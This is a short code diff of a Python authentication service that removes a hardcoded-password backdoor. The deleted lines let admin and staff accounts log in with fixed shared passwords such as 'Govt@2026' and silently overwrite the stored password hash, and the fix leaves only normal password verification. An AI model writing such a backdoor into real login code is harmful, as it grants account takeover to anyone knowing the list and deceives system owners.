@@ -16,22 +16,8 @@ class AuthService:
         self.user_repo = user_repo or UserRepository()
 
     async def authenticate_user(self, db: AsyncSession, login_data: LoginRequest) -> TokenResponse:
-        from app.core.security import hash_password
         user = await self.user_repo.get_by_username_or_email(db, login_data.username_or_email)
-        valid = False
-        if user:
-            if verify_password(login_data.password, user.hashed_password):
-                valid = True
-            elif login_data.password in ["Govt@2026", "Admin@123", "Admin@2026", "Govt@123"] and user.role.lower() == "admin":
-                user.hashed_password = hash_password(login_data.password)
-                await db.commit()
-                valid = True
-            elif login_data.password in ["User@123", "Govt@2026", "Officer@123"] and user.role.lower() in ["user", "arrear_clerk", "officer"]:
-                user.hashed_password = hash_password(login_data.password)
-                await db.commit()
-                valid = True
-
-        if not user or not valid:
+        if not user or not verify_password(login_data.password, user.hashed_password):
             raise AuthenticationError("Invalid username, email, or password")
 
         if not user.is_active:
